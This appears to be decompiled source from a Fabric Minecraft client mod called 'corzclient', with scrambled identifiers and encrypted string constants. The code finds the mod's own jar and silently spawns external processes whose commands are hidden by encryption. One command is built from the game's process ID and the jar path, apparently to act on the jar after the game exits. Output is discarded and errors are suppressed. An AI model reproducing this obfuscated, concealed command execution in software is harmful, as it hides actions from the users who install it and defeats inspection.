package gg.corz;

import java.lang.ProcessBuilder.Redirect;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Locale;
import java.util.Optional;
import net.fabricmc.loader.api.FabricLoader;
import net.fabricmc.loader.api.ModContainer;

public final class IliIIiIilliIIiIi {
   static final String IllIiilIIi = "corzclient";

   public static void liiiIIllIl(Path jar) {
      if (jar != null) {
         try {
            new ProcessBuilder(
                  IIIllIIliIIl<"IIIllIIliIIl","d/kTR2YrTRvZY7TsbJZ/6+Rj8GADqYOwrPoIJniuS8lz+A==">(),
                  IIIllIIliIIl<"IIIllIIliIIl","TJQmSK4VN9KI11JTe+zTRrVMIsxSlSIoA+2pjpnR">(),
                  IIIllIIliIIl<"IIIllIIliIIl","KEJwSZTMS4sWBiqElFbq7mBO5u84I/mn9z+zNVRv">(),
                  jar.toAbsolutePath().toString()
               )
               .redirectOutput(Redirect.DISCARD)
               .redirectError(Redirect.DISCARD)
               .start();
         } catch (Exception var2) {
         }
      }
   }

   public static List<String> iIlIlllllill(long pid, String jarPath) {
      String var3 = IilliliilIIi(jarPath);
      String var4 = IIIllIIliIIl<"IIIllIIliIIl","DXTMiZIQC2pVS2ypLlTuekyNfre29bCjrXK9yXryZwVHEUdfInYevjbbQdk4">()
         + pid
         + IIIllIIliIIl<"IIIllIIliIIl","ZdDtFPCiHgpK3+fATEF2H6pZ5/EvE6TP82zbAYNm6LvZO3eerrsVF5ZKfaJu9RY+Vd+83AicAUiTgoJWZ4H/c5Cqy5026UKmZZ5rZ9UT1486fF8xSqfIXz8S05qYbkKoPnmDz8UoRAVbBLL+">()
         + var3
         + IIIllIIliIIl<"IIIllIIliIIl","WXPp4BY6Nwv8lb9LXZ3bNBDrF3LDknhifbOJpQwBQxSRXZiuK8Bp109C2h6FV98/YHSdIgcVL0XPn5mZbge0">()
         + var3
         + IIIllIIliIIl<"IIIllIIliIIl","RDSLyWRGc0q4JzbwJ1DakWNzJoLLXP+j7/IhgVVn1TF9BcYLEFmJoXITn1CWxCyElxyewYnnzMLcNIxYd1u/Dqetgudsxa59KHa7D9pZ/bOciXdvoOvTcJShrNPsFR/rHw==">();
      return List.of(
         IIIllIIliIIl<"IIIllIIliIIl","aG7enAiYIa9Z+YV+PXZUjl0QP711x+jLLkDwyqiL2ASVXtGD6aE=">(),
         IIIllIIliIIl<"IIIllIIliIIl","+SYoeGu4qxOYY2feDpOIpQig8scV68YKAaG5v1rCiGyBe2ZGFi0=">(),
         IIIllIIliIIl<"IIIllIIliIIl","MqcukgKxYuByp0y3Cs44SqGpd83wg5HlznuwWJc/WIh0QncQrBMzCOA6ww==">(),
         IIIllIIliIIl<"IIIllIIliIIl","ihzFjCguL5hoaHL+4UM0adU1+pIWXXzA0yHEfDzdZxRPXB3PoHMetg==">(),
         IIIllIIliIIl<"IIIllIIliIIl","ekhaKshy3Ie7vtJKOYvbtawExgyrX5oWv/KUO/ZoGDZPqA==">(),
         IIIllIIliIIl<"IIIllIIliIIl","hqwghwtHYoEgPKRmNoOXyA3Lsm1cIoyEydks3HuTbViq6660">(),
         var4
      );
   }

   private IliIIiIilliIIiIi() {
   }

   public static Path IliIlllilIi() {
      try {
         Optional var0 = FabricLoader.getInstance().getModContainer(IIIllIIliIIl<"IIIllIIliIIl","GDj2QUCvuAj+b9GeKtDmKT+zXjCzUbLjkpvrIZTR6qgvivqSdBk=">());
         if (var0.isEmpty()) {
            return null;
         } else {
            for (Path var2 : ((ModContainer)var0.get()).getOrigin().getPaths()) {
               if (var2 != null
                  && var2.getFileName() != null
                  && var2.getFileName()
                     .toString()
                     .toLowerCase(Locale.ROOT)
                     .endsWith(IIIllIIliIIl<"IIIllIIliIIl","jdZ/e9qBXKFxH4gk3aCpv55gPS7RxVtjR3yfgw+GVMQ=">())
                  && Files.isRegularFile(var2)) {
                  return var2;
               }
            }

            return null;
         }
      } catch (Exception var3) {
         return null;
      }
   }

   public static void iliIiiliiiii() {
      Path var0 = IliIlllilIi();
      if (var0 != null) {
         liiiIIllIl(var0);
         lIiiIiIlilli(var0);
      }
   }

   public static void lIiiIiIlilli(Path jar) {
      if (jar != null) {
         try {
            long var1 = ProcessHandle.current().pid();
            new ProcessBuilder(iIlIlllllill(var1, jar.toAbsolutePath().toString())).redirectOutput(Redirect.DISCARD).redirectError(Redirect.DISCARD).start();
         } catch (Exception var3) {
         }
      }
   }

   static String IilliliilIIi(String s) {
      return s.replace(
         IIIllIIliIIl<"IIIllIIliIIl","9B5BLZmDmYvYKXawAs5r2GpYMbYRs2TID8Kcoxw=">(), IIIllIIliIIl<"IIIllIIliIIl","Lbwziw6ZT9vSjCv5AfQ/yupM/hIttJCd8reCCekN">()
      );
   }
}
